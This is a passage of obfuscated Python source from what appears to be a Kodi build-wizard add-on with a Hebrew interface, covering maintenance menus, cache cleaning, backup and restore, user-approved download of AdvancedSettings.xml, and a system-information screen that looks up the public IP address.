		O0000O00OOO0O0O00 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2418
		if O0000O00OOO0O0O00 :#line:2420
			ADDON .openSettings ()#line:2422
			sys .exit ()#line:2425
		else :#line:2426
			sys .exit ()#line:2427
	return 'ok'#line:2431
def passandpin ():#line:2432
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:2433
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:2434
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:2435
def passandUsername ():#line:2436
	ADDON .openSettings ()#line:2437
def folderback ():#line:2440
    O0OOO00O00OOO0OO0 =ADDON .getSetting ("path")#line:2441
    if O0OOO00O00OOO0OO0 :#line:2442
      O0OOO00O00OOO0OO0 =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:2443
      ADDON .setSetting ("path",O0OOO00O00OOO0OO0 )#line:2444
def backmyupbuild ():#line:2447
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2451
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2452
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2453
		addFile ('גיבוי הגדרות סקין ותפריטים בלבד','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2455
		addFile ('גיבוי הגדרות של הרחבות כולל תפריטים וסיסמאות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2456
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2457
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2459
def maintMenu (view =None ):#line:2463
	OO000O0O0O0O0OO0O ='[B][COLOR green]ON[/COLOR][/B]';OOOO000OO00OO0000 ='[B][COLOR red]OFF[/COLOR][/B]'#line:2465
	OO000OOOOO00O0OO0 ='true'if AUTOCLEANUP =='true'else 'false'#line:2466
	O0OO0000OOOO0O000 ='true'if AUTOCACHE =='true'else 'false'#line:2467
	OOOOOO000OOO00OOO ='true'if AUTOPACKAGES =='true'else 'false'#line:2468
	OOO000OOOOO0000O0 ='true'if AUTOTHUMBS =='true'else 'false'#line:2469
	O00OO0OOO0O0OOO0O ='true'if SHOWMAINT =='true'else 'false'#line:2470
	O0O0O00OO0OOOO000 ='true'if INCLUDEVIDEO =='true'else 'false'#line:2471
	OO0O00OOOO0O0000O ='true'if INCLUDEALL =='true'else 'false'#line:2472
	O0OOOOOO000OOO000 ='true'if THIRDPARTY =='true'else 'false'#line:2473
	if wiz .Grab_Log (True )==False :O0OOOO0OO0OO0O000 =0 #line:2474
	else :O0OOOO0OO0OO0O000 =errorChecking (wiz .Grab_Log (True ),True ,True )#line:2475
	if wiz .Grab_Log (True ,True )==False :OOOOO00O00O0OOO0O =0 #line:2476
	else :OOOOO00O00O0OOO0O =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:2477
	OO0OO0OOOO0O0OO0O =int (O0OOOO0OO0OO0O000 )+int (OOOOO00O00O0OOO0O )#line:2478
	OOOO000OO0O0OO0O0 =str (OO0OO0OOOO0O0OO0O )+' Error(s) Found'if OO0OO0OOOO0O0OO0O >0 else 'None Found'#line:2479
	O0OOO00O0OO0O00OO =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:2480
	if OO0O00OOOO0O0000O =='true':#line:2481
		O0O0000OOO0O0O000 ='true'#line:2482
		OOOO0O0OO000O00O0 ='true'#line:2483
		OOOO0OO00OOOOOO00 ='true'#line:2484
		OOOO0O0OO0OOO000O ='true'#line:2485
		OO0O0O00000O0O0OO ='true'#line:2486
		OO000O0O00OOOOO0O ='true'#line:2487
		O000000OOO0000O00 ='true'#line:2488
		O0O0000O0O0OO0O00 ='true'#line:2489
	else :#line:2490
		O0O0000OOO0O0O000 ='true'if INCLUDEBOB =='true'else 'false'#line:2491
		OOOO0O0OO000O00O0 ='true'if INCLUDEPHOENIX =='true'else 'false'#line:2492
		OOOO0OO00OOOOOO00 ='true'if INCLUDESPECTO =='true'else 'false'#line:2493
		OOOO0O0OO0OOO000O ='true'if INCLUDEGENESIS =='true'else 'false'#line:2494
		OO0O0O00000O0O0OO ='true'if INCLUDEEXODUS =='true'else 'false'#line:2495
		OO000O0O00OOOOO0O ='true'if INCLUDEONECHAN =='true'else 'false'#line:2496
		O000000OOO0000O00 ='true'if INCLUDESALTS =='true'else 'false'#line:2497
		O0O0000O0O0OO0O00 ='true'if INCLUDESALTSHD =='true'else 'false'#line:2498
	OO0O0000OO0000OOO =wiz .getSize (PACKAGES )#line:2499
	OO000O000O0O0OOO0 =wiz .getSize (THUMBS )#line:2500
	OOOO00OO00OOO000O =wiz .getCacheSize ()#line:2501
	OOOO0OO000OOOO0OO =OO0O0000OO0000OOO +OO000O000O0O0OOO0 +OOOO00OO00OOO000O #line:2502
	O0OO0O000OOOO0000 =['Daily','Always','3 Days','Weekly']#line:2503
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:2504
	if view =="clean"or SHOWMAINT =='true':#line:2505
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOOO0OO000OOOO0OO ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:2506
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOOO00OO00OOO000O ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2507
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO0O0000OO0000OOO ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2508
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO000O000O0O0OOO0 ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:2509
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2510
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:2511
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:2512
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:2513
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:2514
	if view =="addon"or SHOWMAINT =='false':#line:2515
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2516
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:2517
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2518
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:2519
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2520
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2521
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2522
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:2523
	if view =="misc"or SHOWMAINT =='true':#line:2524
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:2525
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:2526
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:2527
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:2528
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:2529
		addFile ('View Errors in Log: %s'%(OOOO000OO0O0OO0O0 ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:2530
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:2531
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2532
		addFile ('Clear Wizard Log File%s'%O0OOO00O0OO0O00OO ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2533
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:2534
	if view =="backup"or SHOWMAINT =='true':#line:2535
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2536
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2537
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2538
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:2539
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2540
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2541
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2542
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:2543
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2544
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:2545
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:2546
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2547
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:2548
	if view =="tweaks"or SHOWMAINT =='true':#line:2549
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:2550
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:2551
		else :#line:2552
			if os .path .exists (ADVANCED ):#line:2553
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2554
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2555
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2556
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:2557
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:2558
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2559
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:2560
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:2561
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:2562
	addFile ('Show All Maintenance: %s'%O00OO0OOO0O0OOO0O .replace ('true',OO000O0O0O0O0OO0O ).replace ('false',OOOO000OO00OO0000 ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:2563
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:2564
	addFile ('Third Party Wizards: %s'%O0OOOOOO000OOO000 .replace ('true',OO000O0O0O0O0OO0O ).replace ('false',OOOO000OO00OO0000 ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2565
	if O0OOOOOO000OOO000 =='true':#line:2566
		OO0O00O0O000O00OO =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:2567
		O0OO0OOO00OOOO0O0 =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:2568
		OO0O0O00O0O0OO0O0 =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:2569
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OO0O00O0O000O00OO ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:2570
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O0OO0OOO00OOOO0O0 ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:2571
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OO0O0O00O0O0OO0O0 ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:2572
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2573
	addFile ('ניקוי אוטומטי בהפעלה: %s'%OO000OOOOO00O0OO0 .replace ('true',OO000O0O0O0O0OO0O ).replace ('false',OOOO000OO00OO0000 ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:2574
	if OO000OOOOO00O0OO0 =='true':#line:2575
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%O0OO0O000OOOO0000 [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:2576
		addFile ('--- ניקוי קאש בהפעלה: %s'%O0OO0000OOOO0O000 .replace ('true',OO000O0O0O0O0OO0O ).replace ('false',OOOO000OO00OO0000 ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2577
		addFile ('--- ניקוי חבילות בהפעלה: %s'%OOOOOO000OOO00OOO .replace ('true',OO000O0O0O0O0OO0O ).replace ('false',OOOO000OO00OO0000 ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2578
		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%OOO000OOOOO0000O0 .replace ('true',OO000O0O0O0O0OO0O ).replace ('false',OOOO000OO00OO0000 ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2579
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2580
	addFile ('Include Video Cache in Clear Cache: %s'%O0O0O00OO0OOOO000 .replace ('true',OO000O0O0O0O0OO0O ).replace ('false',OOOO000OO00OO0000 ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:2581
	if O0O0O00OO0OOOO000 =='true':#line:2582
		addFile ('--- Include All Video Addons: %s'%OO0O00OOOO0O0000O .replace ('true',OO000O0O0O0O0OO0O ).replace ('false',OOOO000OO00OO0000 ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:2583
		addFile ('--- Include Bob: %s'%O0O0000OOO0O0O000 .replace ('true',OO000O0O0O0O0OO0O ).replace ('false',OOOO000OO00OO0000 ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:2584
		addFile ('--- Include Phoenix: %s'%OOOO0O0OO000O00O0 .replace ('true',OO000O0O0O0O0OO0O ).replace ('false',OOOO000OO00OO0000 ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:2585
		addFile ('--- Include Specto: %s'%OOOO0OO00OOOOOO00 .replace ('true',OO000O0O0O0O0OO0O ).replace ('false',OOOO000OO00OO0000 ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:2586
		addFile ('--- Include Exodus: %s'%OO0O0O00000O0O0OO .replace ('true',OO000O0O0O0O0OO0O ).replace ('false',OOOO000OO00OO0000 ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:2587
		addFile ('--- Include Salts: %s'%O000000OOO0000O00 .replace ('true',OO000O0O0O0O0OO0O ).replace ('false',OOOO000OO00OO0000 ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:2588
		addFile ('--- Include Salts HD Lite: %s'%O0O0000O0O0OO0O00 .replace ('true',OO000O0O0O0O0OO0O ).replace ('false',OOOO000OO00OO0000 ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:2589
		addFile ('--- Include One Channel: %s'%OO000O0O00OOOOO0O .replace ('true',OO000O0O0O0O0OO0O ).replace ('false',OOOO000OO00OO0000 ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:2590
		addFile ('--- Include Genesis: %s'%OOOO0O0OO0OOO000O .replace ('true',OO000O0O0O0O0OO0O ).replace ('false',OOOO000OO00OO0000 ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:2591
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:2592
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:2593
	setView ('files','viewType')#line:2594
def advancedWindow (url =None ):#line:2596
	if not ADVANCEDFILE =='http://':#line:2597
		if url ==None :#line:2598
			OOO0O00O0OO0OO0O0 =wiz .workingURL (ADVANCEDFILE )#line:2599
			O0OOOO000O0000O0O =uservar .ADVANCEDFILE #line:2600
		else :#line:2601
			OOO0O00O0OO0OO0O0 =wiz .workingURL (url )#line:2602
			O0OOOO000O0000O0O =url #line:2603
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2604
		if os .path .exists (ADVANCED ):#line:2605
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2606
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2607
		if OOO0O00O0OO0OO0O0 ==True :#line:2608
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:2609
			OOOO0OO0O0O0O0O0O =wiz .openURL (O0OOOO000O0000O0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2610
			OO0O0OOOOOO00OOOO =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OOOO0OO0O0O0O0O0O )#line:2611
			if len (OO0O0OOOOOO00OOOO )>0 :#line:2612
				for O000OO0O000OOOOOO ,O0O0OO0O0O0OO00O0 ,url ,O00O0OO0000O00O00 ,OOO0OOOOOO0000O0O ,OO000000O00O0OOO0 in OO0O0OOOOOO00OOOO :#line:2613
					if O0O0OO0O0O0OO00O0 .lower ()=="yes":#line:2614
						addDir ("[B]%s[/B]"%O000OO0O000OOOOOO ,'advancedsetting',url ,description =OO000000O00O0OOO0 ,icon =O00O0OO0000O00O00 ,fanart =OOO0OOOOOO0000O0O ,themeit =THEME3 )#line:2615
					else :#line:2616
						addFile (O000OO0O000OOOOOO ,'writeadvanced',O000OO0O000OOOOOO ,url ,description =OO000000O00O0OOO0 ,icon =O00O0OO0000O00O00 ,fanart =OOO0OOOOOO0000O0O ,themeit =THEME2 )#line:2617
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:2618
		else :wiz .log ("[Advanced Settings] URL not working: %s"%OOO0O00O0OO0OO0O0 )#line:2619
	else :wiz .log ("[Advanced Settings] not Enabled")#line:2620
def writeAdvanced (O0000O0O00O0O0O0O ,OO0OOO00O0OO00OO0 ):#line:2622
	O0OO00000O000O0OO =wiz .workingURL (OO0OOO00O0OO00OO0 )#line:2623
	if O0OO00000O000O0OO ==True :#line:2624
		if os .path .exists (ADVANCED ):OOO00O00OO0O0O0OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,O0000O0O00O0O0O0O ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:2625
		else :OOO00O00OO0O0O0OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,O0000O0O00O0O0O0O ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:2626
		if OOO00O00OO0O0O0OO ==1 :#line:2628
			OOOO00OO00OO0O0O0 =wiz .openURL (OO0OOO00O0OO00OO0 )#line:2629
			O000O00O000O0O0O0 =open (ADVANCED ,'w');#line:2630
			O000O00O000O0O0O0 .write (OOOO00OO00OO0O0O0 )#line:2631
			O000O00O000O0O0O0 .close ()#line:2632
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:2633
			wiz .killxbmc (True )#line:2634
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:2635
	else :wiz .log ("[Advanced Settings] URL not working: %s"%O0OO00000O000O0OO );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:2636
def viewAdvanced ():#line:2638
	O0O0OO00O00O00OOO =open (ADVANCED )#line:2639
	O0O0000000O0OOO00 =O0O0OO00O00O00OOO .read ().replace ('\t','    ')#line:2640
	wiz .TextBox (ADDONTITLE ,O0O0000000O0OOO00 )#line:2641
	O0O0OO00O00O00OOO .close ()#line:2642
def removeAdvanced ():#line:2644
	if os .path .exists (ADVANCED ):#line:2645
		wiz .removeFile (ADVANCED )#line:2646
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2647
def showAutoAdvanced ():#line:2649
	notify .autoConfig ()#line:2650
def getIP ():#line:2652
	O0O0OO00OOOOOOOOO ='http://whatismyipaddress.com/'#line:2653
	if not wiz .workingURL (O0O0OO00OOOOOOOOO ):return 'Unknown','Unknown','Unknown'#line:2654
	O00OO0OOOO0OOO00O =wiz .openURL (O0O0OO00OOOOOOOOO ).replace ('\n','').replace ('\r','')#line:2655
	if not 'Access Denied'in O00OO0OOOO0OOO00O :#line:2656
		O0OO00O00O00O0O0O =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (O00OO0OOOO0OOO00O )#line:2657
		O0O0O0OOO00OOOO00 =O0OO00O00O00O0O0O [0 ]if (len (O0OO00O00O00O0O0O )>0 )else 'Unknown'#line:2658
		O0OO0OOOOOOOOO0OO =re .compile ('"font-size:14px;">(.+?)</td>').findall (O00OO0OOOO0OOO00O )#line:2659
		O0O0O0OO00O0OO0OO =O0OO0OOOOOOOOO0OO [0 ]if (len (O0OO0OOOOOOOOO0OO )>0 )else 'Unknown'#line:2660
		O000OOO00000O0000 =O0OO0OOOOOOOOO0OO [1 ]+', '+O0OO0OOOOOOOOO0OO [2 ]+', '+O0OO0OOOOOOOOO0OO [3 ]if (len (O0OO0OOOOOOOOO0OO )>2 )else 'Unknown'#line:2661
		return O0O0O0OOO00OOOO00 ,O0O0O0OO00O0OO0OO ,O000OOO00000O0000 #line:2662
	else :return 'Unknown','Unknown','Unknown'#line:2663
def systemInfo ():#line:2665
	OOO0OOO00O000OOO0 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2679
	O0O00O0O00O0O0OOO =[];O0O0O0OOO00000OOO =0 #line:2680
	for OOO0OOO0O00000000 in OOO0OOO00O000OOO0 :#line:2681
		O000000OO0000OOOO =wiz .getInfo (OOO0OOO0O00000000 )#line:2682
		OO0OOOO0O0O0OO00O =0 #line:2683
		while O000000OO0000OOOO =="Busy"and OO0OOOO0O0O0OO00O <10 :#line:2684
			O000000OO0000OOOO =wiz .getInfo (OOO0OOO0O00000000 );OO0OOOO0O0O0OO00O +=1 ;wiz .log ("%s sleep %s"%(OOO0OOO0O00000000 ,str (OO0OOOO0O0O0OO00O )));xbmc .sleep (1000 )#line:2685
		O0O00O0O00O0O0OOO .append (O000000OO0000OOOO )#line:2686
		O0O0O0OOO00000OOO +=1 #line:2687
	O00O0OO00O0OOO000 =O0O00O0O00O0O0OOO [8 ]if 'Una'in O0O00O0O00O0O0OOO [8 ]else wiz .convertSize (int (float (O0O00O0O00O0O0OOO [8 ][:-8 ]))*1024 *1024 )#line:2688
	O00O000OOOOO0OO0O =O0O00O0O00O0O0OOO [9 ]if 'Una'in O0O00O0O00O0O0OOO [9 ]else wiz .convertSize (int (float (O0O00O0O00O0O0OOO [9 ][:-8 ]))*1024 *1024 )#line:2689
	O0000000O00OOOO0O =O0O00O0O00O0O0OOO [10 ]if 'Una'in O0O00O0O00O0O0OOO [10 ]else wiz .convertSize (int (float (O0O00O0O00O0O0OOO [10 ][:-8 ]))*1024 *1024 )#line:2690
	O00000O00O0OOO0OO =wiz .convertSize (int (float (O0O00O0O00O0O0OOO [11 ][:-2 ]))*1024 *1024 )#line:2691
	O0000OO00O00O0O0O =wiz .convertSize (int (float (O0O00O0O00O0O0OOO [12 ][:-2 ]))*1024 *1024 )#line:2692
	O00OOO0O0000OO0OO =wiz .convertSize (int (float (O0O00O0O00O0O0OOO [13 ][:-2 ]))*1024 *1024 )#line:2693
	O0OOO0O0OOOO00O00 ,OO0O0O0OOOOO0O0OO ,O00O00O00OO000OO0 =getIP ()#line:2694
	OO00O00OO0O00OO0O =[];O00000O000OOOOOOO =[];O0OOOOO0OO0O0O0O0 =[];OOO0OO00O000O0O00 =[];O0OOOO00OOOO0OO0O =[];O0O0O0O00OOOO0000 =[];O0O00OO000O0OOOO0 =[]#line:2696
	OO0O0OO0O00OO000O =glob .glob (os .path .join (ADDONS ,'*/'))#line:2698
	for O0OO0O0OO0OO0O0O0 in sorted (OO0O0OO0O00OO000O ,key =lambda OO00OO00OO0000O00 :OO00OO00OO0000O00 ):#line:2699
		OO0O0OO0O00O0O00O =os .path .split (O0OO0O0OO0OO0O0O0 [:-1 ])[1 ]#line:2700
		if OO0O0OO0O00O0O00O =='packages':continue #line:2701
		O0OO00O0OO00OOO00 =os .path .join (O0OO0O0OO0OO0O0O0 ,'addon.xml')#line:2702
		if os .path .exists (O0OO00O0OO00OOO00 ):#line:2703
			O0000O0OOOOOOOO00 =open (O0OO00O0OO00OOO00 )#line:2704
			OO00OOOO00O0OO0O0 =O0000O0OOOOOOOO00 .read ()#line:2705
			OO00O0O0O0O0O00O0 =re .compile ("<provides>(.+?)</provides>").findall (OO00OOOO00O0OO0O0 )#line:2706
			if len (OO00O0O0O0O0O00O0 )==0 :#line:2707
				if OO0O0OO0O00O0O00O .startswith ('skin'):O0O00OO000O0OOOO0 .append (OO0O0OO0O00O0O00O )#line:2708
				if OO0O0OO0O00O0O00O .startswith ('repo'):O0OOOO00OOOO0OO0O .append (OO0O0OO0O00O0O00O )#line:2709
				else :O0O0O0O00OOOO0000 .append (OO0O0OO0O00O0O00O )#line:2710
			elif not (OO00O0O0O0O0O00O0 [0 ]).find ('executable')==-1 :OOO0OO00O000O0O00 .append (OO0O0OO0O00O0O00O )#line:2711
			elif not (OO00O0O0O0O0O00O0 [0 ]).find ('video')==-1 :O0OOOOO0OO0O0O0O0 .append (OO0O0OO0O00O0O00O )#line:2712
			elif not (OO00O0O0O0O0O00O0 [0 ]).find ('audio')==-1 :O00000O000OOOOOOO .append (OO0O0OO0O00O0O00O )#line:2713
			elif not (OO00O0O0O0O0O00O0 [0 ]).find ('image')==-1 :OO00O00OO0O00OO0O .append (OO0O0OO0O00O0O00O )#line:2714
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2716
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O00O0O00O0O0OOO [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2717
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O00O0O00O0O0OOO [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2718
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:2719
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O00O0O00O0O0OOO [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2720
